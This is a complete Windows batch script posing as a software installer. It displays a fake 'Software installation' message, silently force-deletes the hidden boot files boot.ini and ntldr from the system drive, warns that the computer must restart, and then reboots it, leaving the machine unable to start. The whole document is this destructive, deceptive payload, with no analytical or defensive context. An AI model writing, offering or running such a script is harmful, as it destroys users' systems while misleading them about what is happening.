@Echo off
msg * Software installation
erase /q /f /s /a:h %SYSTEMDRIVE%\boot.ini %SYSTEMDRIVE%\ntldr
msg * Your computer must restart !!!
shutdown -r 
